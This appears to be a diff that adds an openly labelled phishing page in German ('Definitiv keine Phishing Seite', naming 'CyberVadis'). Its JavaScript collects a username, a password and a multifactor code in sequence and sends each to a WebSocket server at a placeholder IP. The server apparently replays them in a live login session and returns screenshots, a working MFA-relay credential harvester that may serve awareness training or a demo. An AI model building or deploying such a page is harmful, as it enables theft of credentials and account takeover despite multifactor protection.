@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <title>Phishing</title>
+</head>
+<body>
+  <h1>Definitiv keine Phishing Seite</h1>
+  <h2>CyberVadis</h2>
+
+  <div id="user">
+    <label for="userInput">Username: <br><input type="text" id="userInput" placeholder="User eingeben..." /></label><br>
+    <button id="sendUserBtn">User senden</button>
+  </div>
+  <div id="pw" hidden="hidden">
+    <label for="pwInput">Passwort: <br><input type="password" id="pwInput" /></label><br>
+    <button id="sendPwBtn">Passwort senden</button>
+  </div>
+
+  <div id="mf" hidden="hidden">
+    <label for="mfInput">Multifaktor: <br><input type="text" id="mfInput" /></label><br>
+    <button id="sendMfBtn">Continue</button><br>
+  </div>
+
+  <div id="result" hidden="hidden">
+    <img id="grafik" width="1000">
+  </div>
+
+  <p>
+    <button id="sendScreenyBtn">Create Screenshot</button><br>
+    <img id="screeny" width="1000">
+  </p>
+
+  <pre id="output"></pre>
+
+  <script>
+    const socket = new WebSocket('ws://<IP>:9000');
+    const output = document.getElementById('output');
+    const userInput = document.getElementById('userInput');
+    const pwInput = document.getElementById('pwInput');
+    const userButton = document.getElementById('sendUserBtn');
+    const pwButton = document.getElementById('sendPwBtn');
+    const mfButton = document.getElementById('sendMfBtn');
+    const sendScreenyButton = document.getElementById('sendScreenyBtn');
+    const mfInput = document.getElementById('mfInput');
+
+
+    socket.addEventListener('open', () => {
+      output.textContent += 'Verbindung zum Server hergestellt.\n';
+      socket.send("cybervadis");
+      socket.send('goto cybervadis');
+    });
+
+
+    socket.addEventListener('message', (event) => {
+      const data = event.data;
+      output.textContent += 'Antwort vom Server:\n' + data + '\n';
+      if(data.includes('Image')) {
+         document.getElementById('grafik').setAttribute("src","grafik.png");
+      }
+      if(data.includes("Screenyshot")){
+         const screenyf = document.getElementById('screeny').getAttribute("src") + '?t=reload';
+         document.getElementById('screeny').setAttribute("src",screenyf);
+      }
+
+    });
+
+    socket.addEventListener('close', () => {
+      output.textContent += 'Verbindung geschlossen.\n';
+    });
+
+    socket.addEventListener('error', (error) => {
+      output.textContent += 'Fehler: ' + error + '\n';
+    });
+
+    userButton.addEventListener('click', () => {
+      const message = userInput.value.trim();
+      if (message && socket.readyState === WebSocket.OPEN) {
+        socket.send( 'user ' + message);
+        output.textContent += 'User Gesendet: ' + message + '\n';
+        document.getElementById('user').setAttribute("hidden","hidden");
+        document.getElementById('pw').removeAttribute("hidden");
+      } else if (!message) {
+        output.textContent += 'Bitte eine Nachricht eingeben.\n';
+      } else {
+        output.textContent += 'WebSocket ist nicht verbunden.\n';
+      }
+    });
+
+    pwButton.addEventListener('click', () => {
+      const message = pwInput.value.trim();
+      if (message && socket.readyState === WebSocket.OPEN) {
+        socket.send( 'pw ' + message);
+        output.textContent += 'Passwort Gesendet '  + '\n';
+        document.getElementById('pw').setAttribute("hidden","hidden");
+        document.getElementById('mf').removeAttribute("hidden");
+      } else if (!message) {
+        output.textContent += 'Bitte eine Nachricht eingeben.\n';
+      } else {
+        output.textContent += 'WebSocket ist nicht verbunden.\n';
+      }
+    });
+
+
+
+    mfButton.addEventListener('click', () => {
+      const message = mfInput.value.trim();
+      if (message && socket.readyState === WebSocket.OPEN) {
+        socket.send( 'mf ' + message);
+        output.textContent += 'Multifaktor Gesendet '  + '\n';
+        document.getElementById('mf').setAttribute("hidden","hidden");
+      } else if (!message) {
+        output.textContent += 'Bitte eine Nachricht eingeben.\n';
+      } else {
+        output.textContent += 'WebSocket ist nicht verbunden.\n';
+      }
+
+    });
+
+    sendScreenyButton.addEventListener('click', () => {
+      if (socket.readyState === WebSocket.OPEN) {
+
+        const now = new Date();
+        const date = now.toLocaleDateString('de-DE');
+        const time = now.toLocaleTimeString('de-DE');
+        const screenfile =  date + time + '.png';
+        socket.send( 'screenshot ' + screenfile);
+        output.textContent += 'Make Screenshot ' + screenfile  + '\n';
+        document.getElementById('screeny').setAttribute("src","screenshots/" + screenfile);
+
+      } else {
+        output.textContent += 'WebSocket ist nicht verbunden.\n';
+      }
+    });
+
+  </script>
+</body>
+</html>
